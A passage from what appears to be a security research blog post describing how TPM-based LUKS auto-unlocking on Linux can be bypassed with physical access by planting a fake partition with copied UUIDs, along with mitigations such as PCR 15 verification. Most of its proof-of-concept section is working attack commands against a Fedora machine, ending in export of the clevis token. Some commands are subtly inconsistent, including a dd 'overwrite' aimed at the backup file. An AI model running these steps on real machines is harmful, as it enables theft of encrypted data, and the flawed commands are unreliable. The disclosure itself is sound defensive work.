from your system completely, so asking for the password is a sane
thing to do.</p><p>But that also means if we replace the encrypted partition with a
new LUKS partition (for which we choose the password), then the TPM
decryption will fail and we will be asked for the password, which
we control. After entering the password, the initrd will now think
it has decrypted the partition correctly and proceed. If we manage
to put the correct kind of filesystem inside of our fake LUKS
partition so that the actual mounting succeeds, we can ship a
malicious <code>init</code> binary that now has full access to the
unlocked TPM, thus allowing us to decrypt the original filesystem,
which we would have to backup before creating our malicious
partition.</p><p>Now you might think the initrd can simply verify the filesystem
UUID before mounting it since we cannot read it from the disk, but
remember that anything the initrd knows is public knowledge, as the
boot partition and initrd image are not encrypted. So we can just
reuse the same LUKS UUID and filesystem UUID if necessary.</p><h3 id="securing-the-system"><span><span><a href="#securing-the-system" aria-label="Anchor link for: securing-the-system">🔗</a></span> Securing the system</span></h3><p>To solve this, we need to be able to authenticate all encrypted
volumes before accessing any file on them. In <a href="https://0pointer.net/blog/brave-new-trusted-boot-world.html">this
article</a> by Lennart Poettering from October 2022, where he
describes the state of secure boot in systemd, he mentions how the
process should look like to make the system secure. It is a bit
involved so let me reiterate the important part.</p><p>After a disk has been unlocked, we want to derive a value from
its volume key (the master key used to encrypt all its data) and
use this value to extend PCR 15. This ensures that any fake volume
would change this value since the original volume key cannot be
known. Using <code>systemd-cryptsetup</code> instead of
<code>cryptsetup</code> can already take care of this by adding
<code>tpm2-measure-pcr=yes</code> to the crypttab file.</p><p>If we now ensure that the disk decryption order is
deterministic, then we can compare the value in PCR 15 against a
known and signed value in the initrd. If the wrong value is
observed, the initrd can now abort the boot process before
executing anything malicious.</p><h3 id="many-broken-guides"><span><span><a href="#many-broken-guides" aria-label="Anchor link for: many-broken-guides">🔗</a></span> Many broken guides</span></h3><p>There are loads of guides that describe in more detail how to
setup TPM2 based disk unlocking, and while the concept is always
the same, you will certainly find one adjusted to your favorite
distribution. Here's a list of guides that I found online, sorted
by date:</p><ul><li><a href="https://jnsgr.uk/2024/04/nixos-secure-boot-tpm-fde/">Secure Boot &amp;
TPM-backed Full Disk Encryption on NixOS</a> (2024/04, NixOS,
systemd-cryptenroll)</li><li><a href="https://forum.manjaro.org/t/howto-using-secure-boot-and-tpm2-to-unlock-luks-partition-on-boot/101626">[HowTo] Using Secure Boot and TPM2 to unlock LUKS partition on
boot</a> (2024/01, Manjaro, systemd-cryptenroll)</li><li><a href="https://community.frame.work/t/guide-setup-tpm2-autodecrypt/39005">[GUIDE] Setup TPM2 Autodecrypt</a> (2023/10, Unspecified,
systemd-cryptenroll, Misuse of PCR 15)</li><li><a href="https://blog.fernvenue.com/archives/debian-with-luks-and-tpm-auto-decryption/">Debian with LUKS and TPM auto decryption</a> (2023/09, Debian,
systemd-cryptenroll)</li><li><a href="https://wiki.gentoo.org/wiki/Trusted_Platform_Module/LUKS">Gentoo
Wiki - Trusted Platform Module/LUKS</a> (2023/05, Gentoo,
clevis)</li><li><a href="https://221b.uk/safe-automatic-decryption-luks-partition-tpm2">Safe
automatic decryption of LUKS partition using TPM2</a> (2023/01,
Fedora, clevis, <a href="https://fedoramagazine.org/automatically-decrypt-your-disk-using-tpm2/">fedoramagazine</a>)</li><li><a href="https://blastrock.github.io/fde-tpm-sb.html">The
ultimate guide to Full Disk Encryption with TPM and Secure Boot</a>
(2022/04, Debian, tpm2-initramfs-tool)</li><li><a href="https://gist.github.com/jdoss/777e8b52c8d88eb87467935769c98a95">Decrypt
LUKS volumes with a TPM on Fedora Linux</a> (2022/03, Fedora,
systemd-cryptenroll)</li><li><a href="https://wiki.archlinux.org/title/User:Krin/Secure_Boot,_full_disk_encryption,_and_TPM2_unlocking_install">ArchWiki/User:Krin/Secure Boot, full disk encryption, and TPM2
unlocking install</a> (2021/09, Arch Linux,
systemd-cryptenroll)</li></ul><p>Unfortunately, I did not find any guide that addresses this, so
most user setups are probably suffering from this issue. Though in
all fairness, whether this is an issue to you obviously depends on
your threat model. If you are using the TPM just to unlock your
home server which nobody else has physical access to, then maybe
this is a non-issue to you. But if you use this to protect the data
on your laptop against theft, then chances are you want to set a
TPM pin or implement PCR 15 verification as explained above.</p><p>Notably, I found that the ArchWiki entry of <a href="https://wiki.archlinux.org/title/Systemd-cryptenroll">systemd-cryptenroll</a>
acknowledges this issue in a warning near the end of the
article:</p><blockquote><p>Only binding to PCRs measured pre-boot (PCRs 0-7) opens a
vulnerability from rogue operating systems. A rogue partition with
metadata copied from the real root filesystem (such as partition
UUID) can mimic the original partition. Then, initramfs will
attempt to mount the rogue partition as the root filesystem
(decryption failure will fall back to password entry), leaving
pre-boot PCRs unchanged. The rogue root filesystem with files
controlled by an attacker is still able to receive the decryption
key for the real root partition. See Brave New Trusted Boot World
and BitLocker documentation for additional information.</p></blockquote><p>And while this is correct, just using any of the PCRs 8-23
doesn't automatically protect your data either. The initrd still
has to ensure that the respective PCR is changed before executing
the system's <code>init</code> binary, which is not done by
default.</p><h2 id="proof-of-concept-exploitation-of-a-fedora-machine"><span><span><a href="#proof-of-concept-exploitation-of-a-fedora-machine" aria-label="Anchor link for: proof-of-concept-exploitation-of-a-fedora-machine">🔗</a></span> Proof-of-concept exploitation of a Fedora machine</span></h2><p>Now, let's have a look at a real system which we will setup in a
similar way to how anyone else would have done it. I've picked one
of the Fedora articles above, but you can expect this to work for
all of the other distributions, too. In summary, my setup included
the following steps:</p><ul><li>Install Fedora 41, I chose an encrypted root with ext4 on
LUKS</li><li>Enable secure boot in the BIOS (and install the Microsoft keys
since Fedora is signed with those keys)</li></ul><p>An interesting thing we notice right away is that the Fedora
bootloader is signed using the Microsoft keys. We've already
briefly talked about this in the beginning, this means it cannot
sign the initrd at all. Instead, they have a signed shim that is
executed after the bootloader which will calculate hashes of the
kernel and initrd and extend PCR 9 with those values. Therefore, it
is critical that we now include PCR 9 in our selection when
enrolling the key to the TPM, otherwise the initrd could just be
modified.</p><p>This approach has the advantage that the user doesn't have to
deal with custom secure boot keys, but the downside is that every
kernel or initrd update will affect the value in PCR 9, thus
requiring us to re-enroll the key after rebooting on each system
update. Here is a snapshot of my PCRs when I enrolled the key into
the TPM. This is also the state that we need to reach later to
succeed.</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> systemd-analyze pcrs
</span><span>NR</span><span> NAME                SHA256
</span><span> </span><span>0</span><span> platform-code       8c2af609e626cc1687f66ea6d0e1a3605a949319514a26e7e1a90d6a35646fa5
</span><span> </span><span>1</span><span> platform-config     299b0462537a9505f6c63672b76a3502373c8934f08a921e1aa50d3adf4ba83d
</span><span> </span><span>2</span><span> external-code       3d458cfe55cc03ea1f443f1562beec8df51c75e14a9fcf9a7234a13f198e7969
</span><span> </span><span>3</span><span> external-config     3d458cfe55cc03ea1f443f1562beec8df51c75e14a9fcf9a7234a13f198e7969
</span><span> </span><span>4</span><span> boot-loader-code    5fdbd66c267bd9513dbc569db0b389a37445e1aa463f9325ea921563e7fb37eb
</span><span> </span><span>5</span><span> boot-loader-config  38a281376260137602e5c70f7a9057e4c55830d22a02bb5a66013d6ac2576d2f
</span><span> </span><span>6</span><span> host-platform       3d458cfe55cc03ea1f443f1562beec8df51c75e14a9fcf9a7234a13f198e7969
</span><span> </span><span>7</span><span> secure-boot-policy  4770a4fb1dac716feaddd77fec9a28bb2015e809a34add1a9d417eec36ec1e17
</span><span> </span><span>8</span><span> -                   e3e23c0da36fa31767885aec7aee3180fb2f5e0b67569c3a82c2a1c3ca88a651
</span><span> </span><span>9</span><span> kernel-initrd       091f6917b0c8788779f4d410046250e6747043a8cd1bd75bf90713cc6de30d99
</span><span>10</span><span> ima                 2566bdf57c3aa880f7b0c480f479c0a88e0e72ae7ef3c1888035e7238bbe9257
</span><span>11</span><span> kernel-boot         0000000000000000000000000000000000000000000000000000000000000000
</span><span>12</span><span> kernel-config       0000000000000000000000000000000000000000000000000000000000000000
</span><span>13</span><span> sysexts             0000000000000000000000000000000000000000000000000000000000000000
</span><span>14</span><span> shim-policy         17cdefd9548f4383b67a37a901673bf3c8ded6f619d36c8007562de1d93c81cc
</span><span>15</span><span> system-identity     0000000000000000000000000000000000000000000000000000000000000000
</span><span>16</span><span> debug               0000000000000000000000000000000000000000000000000000000000000000
</span><span>17</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
</span><span>18</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
</span><span>19</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
</span><span>20</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
</span><span>21</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
</span><span>22</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
</span><span>23</span><span> application-support 0000000000000000000000000000000000000000000000000000000000000000
</span></code></pre><h4 id="inspecting-the-system"><span><span><a href="#inspecting-the-system" aria-label="Anchor link for: inspecting-the-system">🔗</a></span> Inspecting the system</span></h4><p>Now, let's pretend we don't know anything about the system and
that we just obtained physical access to the machine, which was
powered-off.</p><p>We start by taking the main disk out and putting it into our
machine. You may also be able to boot a Fedora or Debian live
image, if the owner has not wiped the Microsoft keys from their
BIOS in favor of their own. Once booted, we start investigating the
disk layout and partitions:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> blkid
</span><span>/dev/nvme0n1p1:</span><span> LABEL_FATBOOT=</span><span>"EFI"</span><span> LABEL=</span><span>"EFI"</span><span> UUID=</span><span>"E2AA-BB8B"</span><span> BLOCK_SIZE=</span><span>"512"</span><span> TYPE=</span><span>"vfat"</span><span> PARTLABEL=</span><span>"EFI System Partition"</span><span> PARTUUID=</span><span>"b9cd5e99-00ec-45e8-be33-72809ae30602"
</span><span>/dev/nvme0n1p2:</span><span> LABEL=</span><span>"boot"</span><span> UUID=</span><span>"d0a1796a-5c1e-446f-8b70-2910d094d195"</span><span> BLOCK_SIZE=</span><span>"4096"</span><span> TYPE=</span><span>"ext4"</span><span> PARTUUID=</span><span>"e5cc6afa-285b-4bc6-8fb1-a6c5344d20a9"
</span><span>/dev/nvme0n1p3:</span><span> UUID=</span><span>"779328d5-00ca-4ade-be44-6daa549642ed"</span><span> TYPE=</span><span>"crypto_LUKS"</span><span> PARTUUID=</span><span>"4e73c89f-3840-458a-ada6-0f5349ab36e1"
</span></code></pre><p>We take a quick peek at the encrypted partition, which is our
main target:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cryptsetup luksDump /dev/nvme0n1p3
</span><span>LUKS</span><span> header information
</span><span>Version:</span><span>        2
</span><span>Epoch:</span><span>          9
</span><span>Metadata</span><span> area:  16384 </span><span>[</span><span>bytes</span><span>]
</span><span>Keyslots</span><span> area:  16744448 </span><span>[</span><span>bytes</span><span>]
</span><span>UUID:</span><span>           779328d5-00ca-4ade-be44-6daa549642ed
</span><span># [...]
</span><span>Tokens:
</span><span>  </span><span>0:</span><span> clevis
</span><span>    </span><span>Keyslot:</span><span>    1
</span><span># [...]
</span></code></pre><p>We can already see that the system owner has used
<code>clevis</code> to configure the automated unlocking. What we
want to find for now is the initrd and kernel command line, so some
GRUB or systemd-boot configuration file. Since Fedora uses
pre-signed images, the EFI partition will only contain the loader
and shim, which shouldn't contain any information about the actual
system. But the boot partition <code>/dev/nvme0n1p2</code> looks
promising, so let's mount it and see what we find:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> mount /dev/nvme0n1p2 /mnt/boot
</span><span>[root@localhost]#</span><span> ls</span><span> -l</span><span> /mnt/boot
</span><span>total</span><span> 222500
</span><span>dr-xr-xr-x.</span><span>  6 root root      4096 Jan 13 23:09 ./
</span><span>dr-xr-xr-x.</span><span> 19 root root      4096 Jan 13 23:06 ../
</span><span>-rw-r--r--.</span><span>  1 root root    277997 Oct 20 02:00 config-6.11.4-301.fc41.x86_64
</span><span>drwx------.</span><span>  3 root root      4096 Jan  1  1970 efi/
</span><span>drwx------.</span><span>  3 root root      4096 Jan 13 23:10 grub2/
</span><span>-rw-------.</span><span>  1 root root 139254374 Jan 13 23:09 initramfs-0-rescue-868c201e807541caacd6fa6b32d5ba2e.img
</span><span>-rw-------.</span><span>  1 root root  45514433 Jan 14 00:54 initramfs-6.11.4-301.fc41.x86_64.img
</span><span>drwxr-xr-x.</span><span>  3 root root      4096 Jan 13 23:06 loader/
</span><span>drwx------.</span><span>  2 root root     16384 Jan 13 23:05 lost+found/
</span><span>-rw-r--r--.</span><span>  1 root root    182584 Jan 13 23:09 symvers-6.11.4-301.fc41.x86_64.xz
</span><span>-rw-r--r--.</span><span>  1 root root   9968458 Oct 20 02:00 System.map-6.11.4-301.fc41.x86_64
</span><span>-rwxr-xr-x.</span><span>  1 root root  16296296 Jan 13 23:08 vmlinuz-0-rescue-868c201e807541caacd6fa6b32d5ba2e</span><span>*
</span><span>-rwxr-xr-x.</span><span>  1 root root  16296296 Oct 20 02:00 vmlinuz-6.11.4-301.fc41.x86_64</span><span>*
</span><span>-rw-r--r--.</span><span>  1 root root       161 Oct 20 02:00 .vmlinuz-6.11.4-301.fc41.x86_64.hmac
</span></code></pre><p>Great! There are the kernel and initrd images plus a
<code>loader/</code> directory containing some GRUB entry
configurations. We will take a look at those configuration files
first:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> ls</span><span> -l</span><span> /mnt/boot/loader/entries
</span><span>-rw-r--r--.</span><span> 1 root root  445 Jan 13 23:10 868c201e807541caacd6fa6b32d5ba2e-0-rescue.conf
</span><span>-rw-r--r--.</span><span> 1 root root  369 Jan 13 23:10 868c201e807541caacd6fa6b32d5ba2e-6.11.4-301.fc41.x86_64.conf
</span><span>[root@localhost]#</span><span> cat /boot/loader/entries/868c201e807541caacd6fa6b32d5ba2e-6.11.4-301.fc41.x86_64.conf
</span><span>title</span><span> Fedora Linux (6.11.4-301.fc41.x86_64) </span><span>41</span><span> (Server Edition)
</span><span>version</span><span> 6.11.4-301.fc41.x86_64
</span><span>linux</span><span> /vmlinuz-6.11.4-301.fc41.x86_64
</span><span>initrd</span><span> /initramfs-6.11.4-301.fc41.x86_64.img
</span><span>options</span><span> root=UUID=1a887df4-286d-4842-bd66-d8993e8596d2 ro rd.luks.uuid=luks-779328d5-00ca-4ade-be44-6daa549642ed rhgb quiet
</span><span>grub_users </span><span>$</span><span>grub_users
</span><span>grub_arg --unrestricted
</span><span>grub_class</span><span> fedora
</span></code></pre><p>Wow, this is looks like we already found all the important
information! Judging from the commandline syntax, this is likely an
initrd that was generated by dracut. There seems to be a LUKS
encrypted partition with UUID
<code>779328d5-00ca-4ade-be44-6daa549642ed</code> and a root file
system with UUID <code>1a887df4-286d-4842-bd66-d8993e8596d2</code>,
which is certainly inside of the LUKS partition. The type of
filesystem is not specified, so we are free to choose anything that
is supported by the initramfs for our fake.</p><h4 id="planning-our-exploit"><span><span><a href="#planning-our-exploit" aria-label="Anchor link for: planning-our-exploit">🔗</a></span> Planning our exploit</span></h4><p>In theory, we'd need to find out one additional thing - the
binary that will be called by the initrd when it want's to switch
to the real system. But the chances are very high that it is
<code>/sbin/init</code> (this is not the case on all systems
though, see the NixOS PoC below for an example). If our assumption
doesn't work out, we can still double check by extracting the
initrd later.</p><p>In order to confuse the initrd, we now need to:</p><ol><li>Backup the original LUKS parition so we can later decrypt
it</li><li>Replace the LUKS partition with a fake LUKS partition that has
the UUID <code>779328d5-00ca-4ade-be44-6daa549642ed</code></li><li>This LUKS partition must contain a filesystem with UUID
<code>1a887df4-286d-4842-bd66-d8993e8596d2</code></li><li>The inner filesystem contains a <code>/sbin/init</code> binary
that does what we want</li></ol><p>We may actually only backup the first few megabytes of the
original LUKS partition and make sure our fake partition is exactly
the same size as our backup. By overwriting just the beginning in
this way we don't have to do a full disk backup, which would
otherwise take a very long time and would require us to bring a
spare disk with us.</p><h4 id="backup-the-beginning-of-the-original-luks-partition"><span><span><a href="#backup-the-beginning-of-the-original-luks-partition" aria-label="Anchor link for: backup-the-beginning-of-the-original-luks-partition">🔗</a></span> Backup the beginning of the original LUKS partition</span></h4><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> dd if=/dev/nvme0n1p3 of=/boot/luks-original.bak bs=64M count=1
</span></code></pre><p>We'll abuse the free space on the boot partition to store this
backup, which makes it easy to access later. If you don't want to
tamper too much with the original disk, you can of course use a
small thumb drive.</p><h4 id="create-fake-partition-and-filesystem-with-matching-uuids"><span><span><a href="#create-fake-partition-and-filesystem-with-matching-uuids" aria-label="Anchor link for: create-fake-partition-and-filesystem-with-matching-uuids">🔗</a></span> Create fake partition and filesystem with matching
UUIDs</span></h4><p>Next, we create a <code>64MB</code> file in which we will
prepare our partition. The size is a bit arbitrary, it just needs
to cover the LUKS and inner filesystem header and must fit our
exploit binary. So we initialize a new LUKS partition with the UUID
from above, and then open it and format its contents with
<code>ext4</code>:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> truncate</span><span> -s</span><span> 64MB /root/fakeluks
</span><span>[root@localhost]#</span><span> cryptsetup luksFormat /root/fakeluks</span><span> --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n</span><span> 1234)</span><span> --uuid</span><span> 779328d5-00ca-4ade-be44-6daa549642ed
</span><span>[root@localhost]#</span><span> cryptsetup open /root/fakeluks fakeluks</span><span> --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n</span><span> 1234)
</span><span>[root@localhost]#</span><span> mkfs.ext4 /dev/mapper/fakeluks</span><span> -U</span><span> 1a887df4-286d-4842-bd66-d8993e8596d2
</span><span>[root@localhost]#</span><span> mount /dev/mapper/fakeluks /mnt/root
</span></code></pre><h4 id="prepare-filesystem"><span><span><a href="#prepare-filesystem" aria-label="Anchor link for: prepare-filesystem">🔗</a></span> Prepare filesystem</span></h4><p>Now we could theoretically prepare a tiny binary that directly
extracts the key from the TPM, but it's far simpler just put a
minimal Alpine image there and install the necessary tools to do
that manually. This will also easily fit into <code>64MB</code>.
Let's proceed by preparing the Alpine filesystem:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cd /mnt/root
</span><span>[root@localhost]#</span><span> wget https://dl-cdn.alpinelinux.org/alpine/v3.21/releases/x86_64/alpine-minirootfs-3.21.2-x86_64.tar.gz
</span><span>[root@localhost]#</span><span> tar xvf alpine-minirootfs-3.21.2-x86_64.tar.gz
</span><span>[root@localhost]#</span><span> rm alpine-minirootfs-3.21.2-x86_64.tar.gz
</span><span>[root@localhost]#</span><span> cat /etc/resolv.conf </span><span>&gt;</span><span> /mnt/root/etc/resolv.conf      </span><span># Just for DNS resolution at this moment, so we can install packages in the chroot
</span><span>[</span><span>root@localhost</span><span>]</span><span># chroot /mnt/root /sbin/apk add </span><span>\                      </span><span># Install some tools that we need
</span><span>                    </span><span>tpm2-tools</span><span> tpm2-tss-tcti-device jose cryptsetup
</span><span>[root@localhost]#</span><span> wget</span><span> -O</span><span> /mnt/root/bin/clevis-decrypt-tpm \
</span><span>                    </span><span>"https://raw.githubusercontent.com/latchset/clevis/0839ee294a2cbb0c1ecf1749c9ca530ef9f59f8f/src/pins/tpm2/clevis-decrypt-tpm2"
</span><span>[root@localhost]#</span><span> chmod +x /mnt/root/bin/clevis-decrypt-tpm             </span><span># Helper to retrieve password from TPM2
</span><span>[root@localhost]#</span><span> sed</span><span> -i </span><span>'s/root:x/root:/'</span><span> /mnt/root/etc/passwd         </span><span># Remove root password
</span></code></pre><h4 id="overwriting-the-partition"><span><span><a href="#overwriting-the-partition" aria-label="Anchor link for: overwriting-the-partition">🔗</a></span>
Overwriting the partition</span></h4><p>Finally, we unmount our fake filesystem and overwrite the first
<code>64MB</code> of the original partition with it, then put the
disk back into the original machine and reboot:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> umount /mnt/root
</span><span>[root@localhost]#</span><span> cryptsetup close /dev/mapper/fakeluks
</span><span>[root@localhost]#</span><span> sync
</span><span>[root@localhost]#</span><span> dd if=/root/fakeluks of=/root/luks-original.bak bs=64M count=1
</span></code></pre><p>We will now be asked for the LUKS password we just set, since
the automatic decryption will obviously not trigger on our fake
partition, which has no token metadata. After entering our password
from above, we are greeted by the Alpine image. We can login as
<code>root</code> without a password:</p><pre><code><span>Welcome to Alpine Linux 3.21
</span><span>Kernel 6.11.4-301.fc41.x86_64 on an x86_64 (/dev/tty1)
</span><span>
</span><span>localhost login: root
</span><span>Welcome to Alpine!
</span><span>
</span><span>localhost:~#
</span></code></pre><h4 id="verifying-pcrs"><span><span><a href="#verifying-pcrs" aria-label="Anchor link for: verifying-pcrs">🔗</a></span> Verifying PCRs</span></h4><p>Now let's check whether any of the PCRs was affected by our
operation:</p><pre data-lang="bash"><code data-lang="bash"><span>localhost:~#</span><span> tpm2_pcrread
</span><span>  </span><span>sha1:
</span><span>  </span><span>sha256:
</span><span>    </span><span>0</span><span> : 0x8C2AF609E626CC1687F66EA6D0E1A3605A949319514A26E7E1A90D6A35646FA5
</span><span>    </span><span>1</span><span> : 0x299B0462537A9505F6C63672B76A3502373C8934F08A921E1AA50D3ADF4BA83D
</span><span>    </span><span>2</span><span> : 0x3D458CFE55CC03EA1F443F1562BEEC8DF51C75E14A9FCF9A7234A13F198E7969
</span><span>    </span><span>3</span><span> : 0x3D458CFE55CC03EA1F443F1562BEEC8DF51C75E14A9FCF9A7234A13F198E7969
</span><span>    </span><span>4</span><span> : 0x5FDBD66C267BD9513DBC569DB0B389A37445E1AA463F9325EA921563E7FB37EB
</span><span>    </span><span>5</span><span> : 0x38A281376260137602E5C70F7A9057E4C55830D22A02BB5A66013D6AC2576D2F
</span><span>    </span><span>6</span><span> : 0x3D458CFE55CC03EA1F443F1562BEEC8DF51C75E14A9FCF9A7234A13F198E7969
</span><span>    </span><span>7</span><span> : 0x4770A4FB1DAC716FEADDD77FEC9A28BB2015E809A34ADD1A9D417EEC36EC1E17
</span><span>    </span><span>8</span><span> : 0xE3E23C0DA36FA31767885AEC7AEE3180FB2F5E0B67569C3A82C2A1C3CA88A651
</span><span>    </span><span>9</span><span> : 0x091F6917B0C8788779F4D410046250E6747043A8CD1BD75BF90713CC6DE30D99
</span><span>    </span><span>10:</span><span> 0x2566BDF57C3AA880F7B0C480F479C0A88E0E72AE7EF3C1888035E7238BBE9257
</span><span>    </span><span>11:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
</span><span>    </span><span>12:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
</span><span>    </span><span>13:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
</span><span>    </span><span>14:</span><span> 0x17CDEFD9548F4383B67A37A901673BF3C8DED6F619D36C8007562DE1D93C81CC
</span><span>    </span><span>15:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
</span><span>    </span><span>16:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
</span><span>    </span><span>17:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
</span><span>    </span><span>18:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
</span><span>    </span><span>19:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
</span><span>    </span><span>20:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
</span><span>    </span><span>21:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
</span><span>    </span><span>22:</span><span> 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
</span><span>    </span><span>23:</span><span> 0x0000000000000000000000000000000000000000000000000000000000000000
</span><span>  </span><span>sha384:
</span><span>  </span><span>sm3_256:
</span></code></pre><p>The output format is slightly different to that of
<code>systemd-analyze pcrs</code>, but we can see that all values
are the same as in the real system. Some boards may have different
values in PCR 1 after every power cycle, but don't worry, in that
case you can be sure that the owner didn't use it either. So this
means our attack was successful! We can now go ahead and retrieve
the volume key of the original partition.</p><p>By quickly skimming <a href="https://github.com/latchset/clevis/blob/0839ee294a2cbb0c1ecf1749c9ca530ef9f59f8f/src/initramfs-tools/scripts/local-top/clevis.in#L78">the clevis source</a> we find that it stores a JWE token in the
LUKS header, which contains an encrypted secondary key to unlock
the partition. It also contains some metadata required to have it
decrypted by the TPM, like which PCRs have to be used in the TPM
context. Back when we inspected the LUKS header, we found the
clevis token in slot 0, so let's first extract this token:</p><pre data-lang="bash"><code data-lang="bash"><span>localhost:~#</span><span> mount</span><span> -o</span><span> remount,rw / </span><span># This alpine image is not writable by default
</span><span>localhost:~#</span><span> mount /dev/nvme0n1p1 /mnt
</span><span>localhost:~#</span><span> cryptsetup token export</span><span> --token-id</span><span> 0 /mnt/luks-original.bak </span><span>| </span><span>tee</span><span> token.json
</span><span>{
</span><span>  </span><span>"type"</span><span>: </span><span>"clevis"</span><span>,
</span><span>  </span><span>"keyslots"</span><span>:</span><span> [
</span><span>    </span><span>"1"
</span><span>  </span><span>],
</span><span>  </span><span>"jwe"</span><span>: </span><span>{
</span><span>    </span><span>"ciphertext"</span><span>: </span><span>"hNNirkMsfcEWcVKfTFCY3JKNCk0x-8P4svgzkeulNhHnuaOdFQ4YfOCUUX9pkWvonfE2uivS"</span><span>,
</span><span>    </span><span>"encrypted_key"</span><span>: </span><span>""</span><span>,
</span><span>    </span><span>"iv"</span><span>: </span><span>"5zuFP0kEuqiCh0QL"</span><span>,
</span><span>    </span><span>"protected"</span><span>: </span><span>"eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwiY2xldmlzIjp7InBpbiI6InRwbTIiLCJ0cG0yIjp7Imhhc2giOiJzaGEyNTYiLCJqd2tfcHJpdiI6IkFOMEFJRXFpblRfb3Y5cTZHVFo3TU1TcW0tUXgzT1RNaEN6ZTVTUUxRTDhDbGNoakFCQ3Z5Tldyd2lZalRaVzZUNG1rSjd4UF9CeDlCa2N0UXFFZzF6eUZ4aTdMcTRBWTcxWnpGOEVrano3QmRlVWZ3TV9PT2pOdGVGcmZFdUItQzRONGRhWDZ0VHk3RTBrc3BuS3luN3VRQ0p6VDVrcU4yYkpPM0FGTEpwbG1JNWxseXhVdHNQZmRSamhSTFUyWXN6V2Fvay1VQlZsNGtuOWNHTUZCNFdZQmFHd01oM0QwZjF1TjdQUVV4cGx6bWtRSmQzX1FRUGZBM3VNMDZRcXY4OU14STVCc3dra3FiWEhSVmhNNFVCOXNLcjd0dzgzVkFFdXpzZ3c5OXciLCJqd2tfcHViIjoiQUU0QUNBQUxBQUFFa2dBZ2d1X2RMZTk2Z0dyRkZycWw2NXltWG5DQ1RMWWVMYXFkQ0NfSkRRa0R4M01BRUFBZ1UwVFhKaXZhaTVuWVNONGNUT05lNkNJR0djX2ZGbDd6ZlNsNUZuOTFvU0kiLCJrZXkiOiJlY2MiLCJwY3JfYmFuayI6InNoYTI1NiIsInBjcl9pZHMiOiI0LDUsNyw5In19fQ"</span><span>,
</span><span>    </span><span>"tag"</span><span>: </span><span>"7DIhyL_ZNocrUHTPr1PQWg"
</span><span>  }
</span><span>}
</span></code></pre><p>Clevis would then proceed to extract a JWE token and hand it to
<code>clevis-decrypt-tpm2</code> which decrypts it using the TPM,
so we replicate the procedure:</p><pre data-lang="bash"><code data-lang="bash"><span># Get the contents of the .jwe field
</span><span>localhost:~#</span><span> jose fmt</span><span> -j</span><span> token.json</span><span> -Og</span><span> jwe</span><span> -o- </span><span>| </span><span>tee</span><span> jwe.json
</span><span>{
</span><span>  </span><span>"ciphertext"</span><span>: </span><span>"hNNirkMsfcEWcVKfTFCY3JKNCk0x-8P4svgzkeulNhHnuaOdFQ4YfOCUUX9pkWvonfE2uivS"</span><span>,
</span><span>  </span><span>"encrypted_key"</span><span>: </span><span>""</span><span>,
</span><span>  </span><span>"iv"</span><span>: </span><span>"5zuFP0kEuqiCh0QL"</span><span>,
